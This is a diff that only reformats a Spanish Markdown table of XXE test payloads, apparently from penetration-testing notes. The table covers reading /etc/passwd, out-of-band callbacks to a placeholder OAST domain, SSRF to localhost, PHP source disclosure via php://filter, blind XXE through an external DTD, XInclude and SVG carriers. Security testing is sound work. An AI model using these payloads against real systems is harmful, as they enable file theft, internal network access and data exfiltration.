@@ -127,18 +127,18 @@ Content-Type: application/xml
 
 #### Lluvia de payloads
 
-|Objetivo|Payload clave|Señal|
-|---|---|---|
-|Entity interna|`<!ENTITY marker "XXE_OK">` + `&marker;`|`XXE_OK` reflejado|
-|Fichero local sencillo|`<!ENTITY xxe SYSTEM "file:///etc/passwd">`|Contenido del fichero|
-|Error de entity|`&doesNotExist;`|Error del parser|
-|OAST con general entity|`<!ENTITY xxe SYSTEM "http://OAST_DOMAIN/ping">` + `&xxe;`|Callback|
-|OAST con parameter entity|`<!ENTITY % xxe SYSTEM "http://OAST_DOMAIN/ping"> %xxe;`|Callback aunque bloqueen entities normales|
-|SSRF local|`http://127.0.0.1:PORT/`|Respuesta interna / diferencia|
-|Source PHP|`php://filter/convert.base64-encode/resource=...`|Base64|
-|Blind con DTD externa|`%remote;` a DTD controlada|Petición a `/xxe.dtd`|
-|XInclude|`<xi:include parse="text" href="file:///etc/passwd"/>`|Inclusión sin `DOCTYPE`|
-|SVG|DTD dentro de fichero `.svg`|Lectura al procesar/renderizar|
+| Objetivo                  | Payload clave                                              | Señal                                      |
+| ------------------------- | ---------------------------------------------------------- | ------------------------------------------ |
+| Entity interna            | `<!ENTITY marker "XXE_OK">` + `&marker;`                   | `XXE_OK` reflejado                         |
+| Fichero local sencillo    | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                | Contenido del fichero                      |
+| Error de entity           | `&doesNotExist;`                                           | Error del parser                           |
+| OAST con general entity   | `<!ENTITY xxe SYSTEM "http://OAST_DOMAIN/ping">` + `&xxe;` | Callback                                   |
+| OAST con parameter entity | `<!ENTITY % xxe SYSTEM "http://OAST_DOMAIN/ping"> %xxe;`   | Callback aunque bloqueen entities normales |
+| SSRF local                | `http://127.0.0.1:PORT/`                                   | Respuesta interna / diferencia             |
+| Source PHP                | `php://filter/convert.base64-encode/resource=...`          | Base64                                     |
+| Blind con DTD externa     | `%remote;` a DTD controlada                                | Petición a `/xxe.dtd`                      |
+| XInclude                  | `<xi:include parse="text" href="file:///etc/passwd"/>`     | Inclusión sin `DOCTYPE`                    |
+| SVG                       | DTD dentro de fichero `.svg`                               | Lectura al procesar/renderizar             |
 
 ---
 
